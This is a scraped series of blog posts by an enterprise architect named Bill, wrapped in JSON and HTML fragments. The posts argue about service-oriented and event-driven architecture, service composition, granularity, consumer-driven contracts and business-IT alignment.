Are they in fact separate architectural styles?  Are they separate concerns?  Do they complement each other?  Does SOA subsume EDA?<br /><br />SOA and EDA are in fact separate architectural styles.  However they describe different concerns of an architecture.  They each bring their own benefits.  As such, it is possible (and in fact good practice) for the two styles to overlap.  An architecture can indeed both be service oriented<i>and</i>event driven.  Likewise it is possible for an architecture to be service oriented but not event driven, or event driven and not service oriented.  This is illustrated below.<br /><br /><a href=\"http://4.bp.blogspot.com/_Ulehi1qz3j0/SNyjOO41YjI/AAAAAAAAAEM/lt-cYi_G-6k/s1600-h/SOA+and+EDA.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://4.bp.blogspot.com/_Ulehi1qz3j0/SNyjOO41YjI/AAAAAAAAAEM/lt-cYi_G-6k/s400/SOA+and+EDA.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5250250730517127730\" /></a><br />An architecture consisting of services with no endpoints with a publish-subscribe binding conforms to the service oriented style of architecture, but is not event driven.  An architecture consisting of messages published over topics, but where there is no notion of services is event driven, but not service oriented.  For example, EAI can be achieved by having a number of applications publishing and subscribing over a set of topics, without explicitly defining any services, endpoints or service contracts.<br /><br />Where SOA and EDA come together, a topic corresponds to a specific endpoint of a specific service.  A topic cannot be shared between endpoints or services, and messages published onto a topic must conform to an explicitly defined service contract.  SOA brings benefits to EDA and vice versa.  Therefore we get the best result when the two architectural styles are combined.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/l7DD_fs6EkA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1308}}

Miguel posted a good<a href=\"https://www.blogger.com/comment.g?blogID=4338956765494283322&postID=2153814277876223807\">question</a>about whether composition in SOA is analogous with composition in Component Oriented Programming.  This really got me to thinking about whether composition actually has any real meaning in SOA at all.<br /><br />One of the key differences between components in Component Oriented Programming and services in SOA is that components must be<i>instantiated</i>.  A client must instantiate a component before the component is used.  Furthermore, multiple instances of a component can and usually do exist at the same time.<br /><br />Composition makes a lot of sense in Component Oriented Programming because we have one or more child components supporting a parent component.  Every new instance of the parent component contains new instances of the child components.<br /><br />Without instancing, composition wouldn't really make a great deal of sense in Component Oriented Programming.  Just because a component uses or references another component, doesn't make those components a composite.  What makes a set of components a composite is the lifetime of the child components being indelibly tied to that of the parent component.  The children are created with the parent and destroyed when the parent is destroyed.  The children have no purpose other than to meet the needs of the parent.<br /><br />SOA is a different ballgame however.  There is only ever one and only one instance of every service.  All services for all intents and purposes are always running (except for the odd moments of downtime) until those services are retired.  So what is a composite in SOA terms?  If I have a service A which consumes services B and C, is A a composite of B and C?  I would say no.  Otherwise all services in our enterprise would simply one big composite.<br /><br />I would suggest that composition in SOA refers to the bringing together of lower level services in order to support one or more higher level services.  It seems we need to have services at different levels in order for composition to make sense in SOA.  So if services B and C are lower level services that form part of the implementation of service A, then I would say that services B and C have been composed to form service A.<br /><br />As I mentioned in my last post, with all the hype around<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered Service Models</a>, where lower level services (like task and entity services) are composed to form higher level process services, we see service composition taking centre stage in SOA discussions far more than it really should.<br /><br />As I've<a href=\"http://bill-poole.blogspot.com/2008/04/soa-and-reuse.html\">previously discussed</a>, the type of reuse central to Layered Service Models (functional reuse as opposed to reuse of events) doesn't really work very well in practice.  Functions exposed at the service level generally are too coarsely grained to be reused in different contexts.  As such, the notion of having a registry of lower level services that can be composed together in support of higher level services is somewhat flawed.<br /><br />We<i>may</i>have lower level services such as integration services, UI services or B2B services that support a higher level business service, but those lower level services should not be reused between the higher level services.  As such, in this case the service composition is really just an implementation detail of the higher level services and as such not really architecturally noteworthy.<br /><br />So I say again, service composition in SOA is only really a noteworthy concept if you're pursuing a Layered Service Model which as I've said before is not ideal.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/LxKn8FQGXww\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1309}}

It identifies the<b>direction</b>and<b>scope</b>of the IT function over the long term in order to achieve<b>advantage</b>for the organisation through its configuration of<b>IT resources</b>within a challenging<b>environment</b>to meet the needs of<b>the business</b>and to fulfil<b>stakeholder</b>expectations.</p><p><b>Business Architecture</b></p><p>Business Architecture is the process of defining the business functions, processes, capabilities, services, roles and reporting relationships that make up a business.  Here, we are referring to Business Architecture applied at the enterprise level, rather than the solution level.</p><p><b>IT Architecture</b></p><p>IT Architecture is often expressed as Information Architecture, Application Architecture and Technology Architecture.  I'll describe these architecture domains in more detail in future posts.  In short, IT Architecture is the process of organising IT and information assets to support the business architecture and IT strategy.</p><br /><br /><p>Businesses that have strong business-IT alignment tend to have the following in common:<ul><li>IT investments can be directly linked to specific strategic business objectives.</li><li>The business drives all major IT initiatives in conjunction and cooperation with IT.</li><li>The business has an explicitly defined IT strategy which is directly linked to the business strategy.</li><li>IT is generally seen as an investment rather than an expense.</li><li>IT has direct representation in the executive leadership team and as such is present during business planning and strategy sessions.</li></ul></p><p>Most businesses today leverage IT only as a support mechanism.  IT is viewed as a cost centre - a means to an end, rather than a strategy enabler.  This is evidenced by the fact that many organisations do not have IT representation in the executive leadership team.</p><p>We see this commonly where the CFO belongs to the executive leadership team, and the CIO reports to the CFO.  In some organisations, the IT function is buried even further down in the hierarchy.  Business strategy is formulated without input from or support of IT.  IT is then involved as late as possible in the process only as a means of<i>executing</i>business strategy, rather than being involved in its<i>formulation</i>.</p><p>As a result of this ethos, IT has little to no visibility of the business strategy.  That is, IT has no visibility of the long term business plan or objectives.  Consequently, IT is limited to adding value<i>reactively</i>rather than<i>proactively</i>.  The IT function is directed to deliver systems with specific<i>tactical</i>scope, which although being part of a broader strategic vision doesn't give IT any visibility of that vision.</p><p>This results in the delivery of IT solutions that meet all the tactical requirements, but do not necessarily align with the long term strategic objectives of the organisation.</p><p>Furthermore, many organisations do not engage in Enterprise Business Architecture practices.  As such, there is no enterprise-wide functional view of the business.  Usually, there is only a structural view in the form of an organisation chart.  We usually find various business processes that have been documented with varying levels of detail, scope and accuracy, but no view as to how those processes fit into the bigger picture or how those processes support the business strategy.</p><p>As such, IT does not have the necessary information in order to formulate an effective enterprise IT architecture.  This only further forces IT down the road of acting tactically rather than strategically.  If IT has no view of the enterprise business architecture, then it cannot structure its IT assets optimally so that IT systems have high cohesion and loose coupling.</p><p>A result of delivering IT systems with only a tactical focus over an extended period of time is an enterprise IT architecture that is an unstructured mess with duplication of functionality (often manifested as many applications performing similar functions across the enterprise), suboptimal distribution of data, data locked in application silos, large numbers of complex and brittle interdependencies between systems, and poor performance and reliability of business critical IT systems.</p><p>Consequently we see an ever increasing percentage of IT budget being spent on maintaining the status quo, rather than being spent on investing in new capabilities that deliver new value to the enterprise.  Clearly this position is not sustainable in a competitive market.</p><p>One of the key ingredients in achieving business-IT alignment is an Enterprise Architecture program.  Businesses are already seeing significant returns from this investment, and time is running out for businesses that have not yet commenced engaging in this practice.</p><img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/94uv3XlhB7Q\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1310}}

With service composition, we are referring to the creation of new services from wiring up of existing services in new ways to deliver new value.<br /><br />According to the standard reading material, service composition is best achieved through<i>orchestration</i>.  This is usually achieved through the use of middleware such as an ESB or integration broker.  A workflow orchestrates the invocations of a number of services in order to achieve some particular outcome.<br /><br />As such, we find that a service may comprise some of its own logic (including the orchestration logic), as well as a number of lower level services.<br /><br />This concept of service composition is central to the<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered Service Model</a>where lower level task and entity services are composed into higher level process services.  As you will have gleaned from my previous posts on the topic, I'm not a supporter of the Layered Service Model approach.  One of the issues of this approach is that lower level services are reused by many higher level services, resulting in high coupling between those higher level services.<br /><br />In the past, I have highly recommended that people pursue what I call a<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">Self-Contained Process-Centric Service Model</a>.  Here, services are centred around autonomous business functions such as Sales, Marketing and Billing.  What I probably didn't emphasise about this approach however is that it refers only to the top-level service model.  Each business service<i>may</i>be composed of lower level services.<br /><br />Note that these lower level services are not<i>business services</i>.  They are services that serve a particular function in support of the business service.  They are an implementation detail of the business service.  In fact, they are actually really just distributed components or integration points.  However if the means of communication with the distributed component or integration point is the exchange of messages via endpoints in conformance with a service contract, then we technically have a service by the strict definition of SOA.<br /><br />In a green fields implementation where the software supporting each business service is built from scratch, there may be no lower level services involved.  That is, there is no service composition.  Alternatively, the service software may be implemented with a smart client application that interacts with some back end components via the exchange of messages in conformance to a service contract.  Thus, those back end components technically expose a service to the smart client application.<br /><br />Say in support of this business service, the back end components also interact with a Web service provided by another organisation. Now we have another service added to the mix.  Here we can see services being composed in support of the larger business service.<br /><br />Where a business service is supported by a number of legacy applications we see even more composition.  When the business service receives a message, it must invoke one or more of these legacy applications appropriately.  This<i>may</i>be achieved by invoking Web services exposed by these applications, thus constituting further service composition.<br /><br />So we see that services certainly can be composed in support of larger services.  However I would hesitate to name this as a benefit of the SOA style of architecture.  It is merely an implementation choice of any given service.  Service composition has only come to be viewed by many as a key benefit of SOA due to the reuse promised (falsely in my opinion) by the Layered Service Model approach.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/719ViZa3CHU\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1311}}

Well this is one of those unfortunate situations where the answer is, it depends.  However there are some good rules of thumb that can lead you to determine whether you're on the right track in terms of defining your service model.<br /><br />In the field, the number of services we see in any given enterprise tends to vary wildly.  In some organisations there is only one service - theüberservice.  Other organisations have stated they have well over 10,000 services.  But how good are these architectures?  As I've<a href=\"http://bill-poole.blogspot.com/2008/05/soa-quality-spectrum.html\">previously stated</a>just because an architecture is service oriented doesn't make it good.<br /><br />We've discussed<a href=\"http://bill-poole.blogspot.com/2008/06/are-bad.html\">überservices</a>before and they are clearly not a good thing.  So we definitely want more than one service.  But 10,000?  How on earth did they achieve that figure?  Well at the end of the day the number of services you'll end up with is largely determined by the granularity of your services.  Fine grained services will result in more services than coarse grained services.  We've discussed<a href=\"http://bill-poole.blogspot.com/2008/04/service-granularity.html\">service granularity</a>before too.<br /><br />Ultimately the number of services you end up with will largely be determined by the flavour of SOA you pursue.  If you take the<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS approach</a>(not recommended), then you could end up with<i>any</i>number of services.  You're building services in a completely uncontrolled way that doesn't conform to any particular architecture.  Usually the longer you follow this path, the more services you'll end up with.  Hopefully you stop before you reach 10,000.<br /><br />If you go down the road of<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>then you'll end up with the same number of services as you have applications you are trying to integrate.  If you have 400 applications in your enterprise, you'll end up with 400 services.  Again, I wouldn't recommend this approach.<br /><br /><a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered service models</a>have to take the prize in this competition.  Due to the incredible fine granularity of services in this model you can literally end up with thousands of services!  This is yet another reason why I wouldn't recommend this approach.<br /><br />And finally we have<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">self-contained process-centric service models</a>.  With this approach services are centred around process-centric cohesive business capabilities.  The number of services you will end up with will depend on the overall complexity of your business model.  But about 10-20 services is a good rule of thumb.  Any more than 30 or 40 and I'd be raising the alarm bells.<br /><br />Another thing to note is that the size of the organisation (in terms of staffing levels) is not a major factor in determining the appropriate number of services.  The number of services will grow as the complexity of the business model grows.  Keep in mind though that sometimes the complexity of the business must grow in order to cater for increased staffing levels.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/CaaUIxee4Ek\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1312}}

The draft ontology in its current form makes reference to an example business scenario based on an imaginary car washing business.  The scenario is outlined below.<br /><br /><i>\"Joe has a one-man business. He stands on a street corner with a sponge, a bucket of water, and a sign saying \"Car Wash $5\". A customer drives up to him and asks him to wash the car. Joe asks the customer for five dollars. The customer gives him five dollars. Joe washes the car, then says, \"That's all done now,\" and the customer drives away.\"</i><br /><br />The Open Group at present states that this example identifies a single service, which embodies a single repeatable business activity performed by Joe - washing the car.  The customer is identified as the service consumer.  The customer \"consumes\" the service when he or she pays the five dollars for the car to be washed.<br /><br />There are however some issues with this model.  Firstly, the service identified in the model consists only of a single business activity. Services modelled this way are far too finely grained, thus resulting in low cohesion and high coupling between services.  A business service represents an entire cohesive business function, which may contain many processes and activities.<br /><br />Secondly, the service model completely omits the Sales function.  Although we are looking at a one man business, there are two business functions here (each of which translate to a business service).  There are two different processes at play here –<b>Sell Car Wash</b>, and<b>Wash Car</b>.  The<b>Sell Car Wash</b>process involves two roles – the Customer and the Salesperson.  The<b>Wash Car</b>process involves only one role – the Car Washer.  Joe just happens to hold two roles – the Salesperson and Car Washer roles.<br /><br />As the model as described by The Open Group consists only of one process, it is unclear as to whether their model follows an event driven paradigm.  Modelling the business architecture around business services and events provides for a far more loosely coupled and maintainable business architecture than other approaches.<br /><br />The example business scenario calls for a single end-to-end business process spanning two business services.  This is best represented as<i>two</i>business processes separately defined, but connected via a single<i>business event</i>which we might call<i>Sale Completed</i>.  This is the end event of the<b>Sell Car Wash</b>process and the begin event of the<b>Wash Car</b>process.  This is illustrated in the EPC diagram below.<br /><br /><a href=\"http://bp1.blogger.com/_Ulehi1qz3j0/SJcvdzYReiI/AAAAAAAAAD8/l-XGh5HG65Y/s1600-h/Business+Architecture.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp1.blogger.com/_Ulehi1qz3j0/SJcvdzYReiI/AAAAAAAAAD8/l-XGh5HG65Y/s400/Business+Architecture.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5230701681268849186\" /></a><br />Modelling our services this way has our Car Wash service as a consumer of our Sales service.  The customer is merely a participant in the Sales business service.  He or she is not a service consumer.<br /><br />Now although we could indeed model our business architecture as outlined by The Open Group, to do so would produce a Business Architecture with business processes spanning multiple business areas, thus having low cohesion.  This would produce a more unstable business architecture description and provide a poorer footing for our IT architecture.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/iv4cQfcuzzw\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1313}}

Better late than never though, so I thought I'd take the opportunity to discuss the concept now.<br /><br />Consumer driven contracts as an approach is intended to provide inputs into the service provider's contract design to ensure relevance, as well as provide constraints on how a service provider's contract can evolve over time such that compatibility is maintained with consumers.<br /><br />However the intention should always be that the service provider contract evolves in such a way as to better express the concepts of the provider.  We don't want to reduce the semantic fidelity of communications with our services.<br /><br />I would say that as long as you're sticking mainly to publish-subscribe messaging (that is, avoiding command messages), then the needs of the consumer are considerably less relevant.  Consumers are only<i>informed</i>of events as they happen.  Command messages produce a subtle form of coupling where the service consumer<i>instructs</i>the service provider what to do.<br /><br />Services that publish events do not prescribe or assume what subscribed services will do (if anything) once a notification message is received.  An event message describes only an event that occurred within a service.  The subscribers should really have no influence on this.  As such, they should not be influencing the schema of the event messages published by the service provider.<br /><br />So when using publish-subscribe messaging, I would suggest that consumer contracts are useful only in providing constraints on what can be changed in the service provider's contract in order to maintain compatibility with its consumers.<br /><br />That being said, service contracts tend to be quite stable with<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">process-centric self-contained service models</a>- so I've not personally found consumer driven contracts worth the effort.<br /><br />Consumer driven contracts really come into their own with data-centric contracts and centralised data architectures.  When we always need to go and get our data from elsewhere, and all our service consumers use that data for different purposes, consumers have a substantial dependency on the service provider's schema.  They will likely need to influence the provider's schema quite regularly.  That in turn will affect the other consumers.<br /><br />This is yet another reason to pursue process-centric service contracts with decentralised data architectures.  It keeps your service contracts stable by virtue of minimising dependencies between service providers and consumers.

Although I don't personally write software these days, I've certainly done my share of it in the past and I currently manage Change Corporation's body of knowledge in the area.<br /><br />So let's get started:<br /><br /><b>How old were you when you started programming?</b><br /><br />I can't really remember it was so long ago.  But I think I was about 16 years old.  I started writing \"demos\", which were effectively programs that did various visual effects (like flying through tunnels and what have you).  The demos were entered into demo competitions.  Very nerdy really.<br /><br />I also wrote a music player application that played music stored in the S3M format.  If anyone can remember, that was the Scream Tracker file format.  The player was written in 80386 assembler and natively managed Expanded Memory (if anyone can remember that from the days of the 286 computer), hardware interrupts, and direct memory access (DMA).  The player did real time digital mixing.<br /><br /><b>What was your first programming language?</b><br /><br />I first started writing programs in C, but soon moved into 80386 assembler, and C++.  Eventually I got into Visual Objects, Visual Basic, Java and then C#.  I've also dabbled in Smalltalk and Eiffel.<br /><br /><b>What was the first real program you wrote?</b><br /><br />I suppose this question depends on the definition of \"real\".  The first commercial application I wrote was a consignment management system I think for a freight company.  It was so long ago I can't really remember - but it was written in Visual Objects.<br /><br /><b>If you knew then what you know now would you have started programming?</b><br /><br />Well I'm not really programming at all these days, so I guess if I knew then what I know now then I'd be doing Enterprise Architecture.  Although it would be hard to get businesses to take me seriously in that capacity as a 16 year old.  If I knew I would eventually end up doing Enterprise Architecture, then yes I would indeed have started programming as it eventually got me to where I wanted to be.<br /><br /><b>What’s the most fun you’ve ever had... programming?</b><br /><br />Hard to say.  There's always been good times and bad.  I can't say that I've ever found commercial programming<i>fun</i>exactly.  I've always found it rewarding and enjoyable.  I would say that the demo programs I wrote many years ago were fun to write.  I wasn't being paid for it, so they must have been. :-)<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/-RByDg-Aib4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1315}}

But what is the physical manifestation of a business service?  Once we've determined the boundaries of our business services and their responsibilities, how do we go about implementing them?<br /><br />A business service is realised as a set of business processes and business rules, the people that perform those processes, the applications leveraged by those people in support of their roles in those business processes, the information leveraged by decision makers within those business processes, as well as the information as inputs and outputs of those processes, the semantics and structure of data held within the service, and the technology platforms on which the IT systems supporting the business service execute.<br /><br />Business processes in different services coordinate their activities via business events.  These business events define the interface (or service contracts) between business services.<br /><br />A business service may contain no IT systems whatsoever.  Where there<i>are</i>IT systems supporting a business service, they may not at all support the interface with the rest of the business.  A business event may be realised by a simple telephone call or a memo sent between people participating in different business services.<br /><br />Where IT systems<i>do</i>support the interface with the rest of the business, we have software components in different business services exchanging data.  In the SOA style of architecture, this data exchange is performed by way of exchanging explicitly defined messages in conformance with a service contract.<br /><br />Where we design our software components around business services (rather than taking the<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS</a>,<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>or<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered service Model</a>approach), business events are realised as event messages published onto our service bus.  The technical service contract then consists of the schema of the messages published by the service onto one or more topics.<br /><br />Inside the boundary of our business service, we may have one or more software components that exchange data via messages.  For example, a smart client application supporting a business service may interface with one or more back end components using SOAP based messages.<br /><br />These interactions that occur<i>behind</i>the service boundary are an implementation detail of the service itself.  These design aspects are local to the business service and as such do not influence the business service contract or play a part in the broader architecture.<br /><br />In conclusion, the way in which business services are manifested in terms of IT systems depends on the flavour of SOA chosen. By aligning our technical service contracts with business services and business events we achieve considerably better structural alignment between the business and the IT systems that support it.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/IBou74EiLjA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1316}}
